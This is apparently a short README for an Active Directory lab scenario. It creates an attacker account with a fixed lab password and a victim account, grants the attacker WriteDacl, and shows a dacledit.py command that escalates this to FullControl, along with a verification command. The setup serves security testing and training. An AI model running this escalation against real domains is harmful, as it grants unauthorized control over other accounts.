# acl-writedacl-user

User with WriteDacl on another user. Creates `scn-acl-wdu-attacker` (password `Aa1234567890!`) and the user `scn-acl-wdu-victim`, and gives the attacker `WriteDacl` (inheritance `None`) on it.

Attack:

    dacledit.py -action write -rights FullControl -principal scn-acl-wdu-attacker -target scn-acl-wdu-victim <domain>/scn-acl-wdu-attacker:'Aa1234567890!' -dc-ip <dc ip>

How to verify:

    dacledit.py -action read -principal scn-acl-wdu-attacker -target scn-acl-wdu-victim <domain>/scn-acl-wdu-attacker:'Aa1234567890!' -dc-ip <dc ip>   # shows WriteDACL

Disable deletes both objects (the ACE goes with the target).
